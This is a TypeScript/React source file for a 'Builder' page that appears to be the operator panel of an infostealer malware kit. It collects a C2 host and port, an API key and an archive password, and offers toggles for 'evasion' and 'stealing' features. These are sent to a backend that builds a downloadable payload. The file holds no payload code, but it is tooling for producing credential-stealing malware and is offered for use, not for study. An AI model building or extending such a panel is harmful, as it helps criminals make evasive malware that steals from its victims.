'use client'

import { useBuild, useBuilderFeatures, useBuilderState, BuildConfig } from '@/hooks/use-builder'
import { api, apiBase } from '@/lib/api'
import { Download, RefreshCw } from 'lucide-react'
import { useEffect, useMemo, useState } from 'react'

const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

function genKey(n: number) {
    const bytes = crypto.getRandomValues(new Uint8Array(n))
    return Array.from(bytes, b => ALPHA[b % ALPHA.length]).join('')
}

//shared primitives

function SectionCard({ title, children }: { title: string; children: React.ReactNode }) {
    return (
        <div className="border border-zinc-700/50 bg-zinc-900/40 rounded-lg p-4">
            <p className="text-zinc-400 text-xs uppercase tracking-widest mb-4">{title}</p>
            {children}
        </div>
    )
}

function Field({ label, value, onChange, placeholder, mono = false }: {
    label:       string
    value:       string
    onChange:    (v: string) => void
    placeholder?: string
    mono?:       boolean
}) {
    return (
        <label className="flex flex-col gap-1 text-sm">
            <span className="text-zinc-400">{label}</span>
            <input
                value={value}
                onChange={(e) => onChange(e.target.value)}
                placeholder={placeholder}
                className={`bg-zinc-800 border border-zinc-700/50 rounded px-3 py-2 text-white placeholder-zinc-600 focus:outline-none focus:border-zinc-500 ${mono ? 'font-mono text-xs' : ''}`}
            />
        </label>
    )
}

function TypeToggle({ value, onChange }: {
    value:    'release' | 'debug'
    onChange: (v: 'release' | 'debug') => void
}) {
    const btn = (v: 'release' | 'debug', label: string) => (
        <button
            key={v}
            onClick={() => onChange(v)}
            className={`h-8 px-4 rounded-md text-xs font-medium cursor-pointer select-none transition-all ${
                value === v
                    ? 'bg-violet-500/15 text-violet-300 ring-1 ring-violet-500/40'
                    : 'text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
        >
            {label}
        </button>
    )
    return (
        <label className="flex flex-col gap-1 text-sm">
            <span className="text-zinc-400">Build type</span>
            <div className="flex gap-2">
                {btn('release', 'release')}
                {btn('debug',   'debug')}
            </div>
        </label>
    )
}

function FeatureToggle({ label, enabled, onChange }: {
    label:    string
    enabled:  boolean
    onChange: (v: boolean) => void
}) {
    return (
        <button
            onClick={() => onChange(!enabled)}
            className={`flex items-center gap-2 h-7 px-2.5 rounded text-xs font-medium w-full text-left cursor-pointer select-none transition-all ${
                enabled
                    ? 'text-zinc-200 hover:bg-zinc-800/60'
                    : 'text-zinc-600 hover:bg-zinc-800/40 hover:text-zinc-500'
            }`}
        >
            <span className={`w-1.5 h-1.5 rounded-full shrink-0 transition-colors ${enabled ? 'bg-violet-400' : 'bg-zinc-700'}`} />
            {label}
        </button>
    )
}

//page

export default function Page() {
    const { features, apiKey: serverApiKey, zipPass: serverZipPass, isLoading: featLoading } = useBuilderFeatures()
    const { state, refetch }                                         = useBuilderState()
    const { build, isLoading: building, error: buildError }         = useBuild(refetch)

    const [c2Host,    setC2Host]    = useState('')
    const [c2Port,    setC2Port]    = useState('3001')
    const [apiKey,    setApiKey]    = useState(() => genKey(20))
    const [zipPass,   setZipPass]   = useState(() => genKey(22))

    useEffect(() => { if (serverApiKey) setApiKey(serverApiKey) }, [serverApiKey])
    useEffect(() => { if (serverZipPass) setZipPass(serverZipPass) }, [serverZipPass])
    const [buildType, setBuildType] = useState<'release' | 'debug'>('release')
    const [enabled,   setEnabled]   = useState<Record<string, boolean>>({})

    const evasion  = useMemo(() => features.filter(f => f.group === 'evasion'),  [features])
    const stealing = useMemo(() => features.filter(f => f.group === 'stealing'), [features])

    const isEnabled = (key: string) => enabled[key] !== false

    const toggleFeature = (key: string, v: boolean) =>
        setEnabled(prev => ({ ...prev, [key]: v }))

    const toggleGroup = (keys: string[], on: boolean) =>
        setEnabled(prev => Object.fromEntries([
            ...Object.entries(prev),
            ...keys.map(k => [k, on]),
        ]))

    const handleBuildTypeChange = (type: 'release' | 'debug') => {
        setBuildType(type)
        setEnabled(prev => ({
            ...prev,
            ...Object.fromEntries(evasion.map(f => [f.key, type === 'release'])),
        }))
    }

    const refreshApiKey = async () => {
        const k = genKey(20)
        setApiKey(k)
        await api('/builder/env', { method: 'PATCH', body: JSON.stringify({ apiKey: k }) }).catch(() => {})
    }

    const refreshZipPass = async () => {
        const p = genKey(22)
        setZipPass(p)
        await api('/builder/env', { method: 'PATCH', body: JSON.stringify({ zipPass: p }) }).catch(() => {})
    }

    const handleBuild = () => {
        if (!c2Host) return
        const cfg: BuildConfig = {
            buildType,
            c2Host,
            c2Port: c2Port || '3001',
            apiKey,
            zipPass,
            features: Object.fromEntries(features.map(f => [f.key, isEnabled(f.key)])),
        }
        build(cfg)
    }

    const isBusy      = state.status === 'building' || building
    const showLog     = state.status !== 'idle'
    const buildDone   = state.status === 'done'
    const buildFailed = state.status === 'error'

    return (
        <div className="flex flex-col gap-4 max-w-4xl">
            <h1 className="text-white font-semibold text-lg">Builder</h1>

            {/* config */}
            <SectionCard title="Config">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    <Field
                        label="C2 host"
                        value={c2Host}
                        onChange={setC2Host}
                        placeholder="1.2.3.4 or domain.com"
                    />
                    <Field
                        label="C2 port"
                        value={c2Port}
                        onChange={setC2Port}
                        placeholder="3001"
                    />
                    <div className="flex flex-col gap-1 text-sm">
                        <span className="text-zinc-400">API key</span>
                        <div className="flex gap-2">
                            <input
                                value={apiKey}
                                onChange={(e) => setApiKey(e.target.value)}
                                className="flex-1 min-w-0 bg-zinc-800 border border-zinc-700/50 rounded px-3 py-2 text-white font-mono text-xs placeholder-zinc-600 focus:outline-none focus:border-zinc-500"
                            />
                            <button
                                onClick={refreshApiKey}
                                className="shrink-0 bg-zinc-800 border border-zinc-700/50 rounded px-2.5 text-zinc-400 hover:text-white hover:border-zinc-500 transition-colors cursor-pointer"
                                title="Regenerate"
                            >
                                <RefreshCw size={13} />
                            </button>
                        </div>
                    </div>
                    <div className="flex flex-col gap-1 text-sm">
                        <span className="text-zinc-400">ZIP password</span>
                        <div className="flex gap-2">
                            <input
                                value={zipPass}
                                onChange={(e) => setZipPass(e.target.value)}
                                className="flex-1 min-w-0 bg-zinc-800 border border-zinc-700/50 rounded px-3 py-2 text-white font-mono text-xs placeholder-zinc-600 focus:outline-none focus:border-zinc-500"
                            />
                            <button
                                onClick={refreshZipPass}
                                className="shrink-0 bg-zinc-800 border border-zinc-700/50 rounded px-2.5 text-zinc-400 hover:text-white hover:border-zinc-500 transition-colors cursor-pointer"
                                title="Regenerate"
                            >
                                <RefreshCw size={13} />
                            </button>
                        </div>
                    </div>
                    <TypeToggle value={buildType} onChange={handleBuildTypeChange} />
                </div>
            </SectionCard>

            {/* features */}
            {!featLoading && features.length > 0 && (
                <SectionCard title="Features">
                    <div className="grid grid-cols-2 gap-x-6 gap-y-0">
                        {/* evasion */}
                        <div>
                            <div className="flex items-center justify-between mb-1">
                                <span className="text-zinc-600 text-xs">— evasion —</span>
                                <div className="flex gap-1">
                                    <button onClick={() => toggleGroup(evasion.map(f => f.key), true)}  className="text-zinc-600 text-xs hover:text-zinc-300 cursor-pointer transition-colors">all</button>
                                    <span className="text-zinc-700 text-xs">/</span>
                                    <button onClick={() => toggleGroup(evasion.map(f => f.key), false)} className="text-zinc-600 text-xs hover:text-zinc-300 cursor-pointer transition-colors">none</button>
                                </div>
                            </div>
                            {evasion.map(f => (
                                <FeatureToggle
                                    key={f.key}
                                    label={f.label}
                                    enabled={isEnabled(f.key)}
                                    onChange={(v) => toggleFeature(f.key, v)}
                                />
                            ))}
                        </div>

                        {/* stealing */}
                        <div>
                            <div className="flex items-center justify-between mb-1">
                                <span className="text-zinc-600 text-xs">— stealing —</span>
                                <div className="flex gap-1">
                                    <button onClick={() => toggleGroup(stealing.map(f => f.key), true)}  className="text-zinc-600 text-xs hover:text-zinc-300 cursor-pointer transition-colors">all</button>
                                    <span className="text-zinc-700 text-xs">/</span>
                                    <button onClick={() => toggleGroup(stealing.map(f => f.key), false)} className="text-zinc-600 text-xs hover:text-zinc-300 cursor-pointer transition-colors">none</button>
                                </div>
                            </div>
                            {stealing.map(f => (
                                <FeatureToggle
                                    key={f.key}
                                    label={f.label}
                                    enabled={isEnabled(f.key)}
                                    onChange={(v) => toggleFeature(f.key, v)}
                                />
                            ))}
                        </div>
                    </div>
                </SectionCard>
            )}

            {/* build row */}
            <div className="flex items-center gap-3">
                <button
                    onClick={handleBuild}
                    disabled={isBusy || !c2Host}
                    className="bg-(--accent-color) hover:bg-(--accent-color)/80 disabled:opacity-40 disabled:cursor-not-allowed text-white px-4 py-1.5 rounded-md text-sm font-medium cursor-pointer select-none transition-colors"
                >
                    {isBusy ? 'Building…' : 'Build'}
                </button>

                {buildDone && state.zipPass && (
                    <span className="text-zinc-400 text-xs font-mono">
                        zip pass: <span className="text-white select-all">{state.zipPass}</span>
                    </span>
                )}

                {buildError && (
                    <span className="text-red-400 text-xs">{buildError}</span>
                )}
            </div>

            {/* log output */}
            {showLog && (
                <SectionCard title={buildDone ? 'Build log — done' : buildFailed ? 'Build log — failed' : 'Build log'}>
                    <pre className="bg-black/40 rounded p-3 text-xs font-mono text-zinc-300 overflow-auto max-h-80 whitespace-pre-wrap break-words leading-relaxed">
                        {state.log || '…'}
                    </pre>
                </SectionCard>
            )}

            {/* download */}
            {buildDone && (
                <div className="flex items-center gap-3 px-4 py-3 border border-zinc-700/50 bg-zinc-900/40 rounded-lg">
                    <span className="text-green-400 text-sm">{state.filename}</span>
                    <a
                        href={`${apiBase()}/builder/download`}
                        className="ml-auto flex items-center gap-1.5 bg-(--accent-color) hover:bg-(--accent-color)/80 text-white px-3 py-1.5 rounded-md text-sm font-medium cursor-pointer select-none transition-colors"
                    >
                        <Download size={14} />
                        Download
                    </a>
                </div>
            )}
        </div>
    )
}
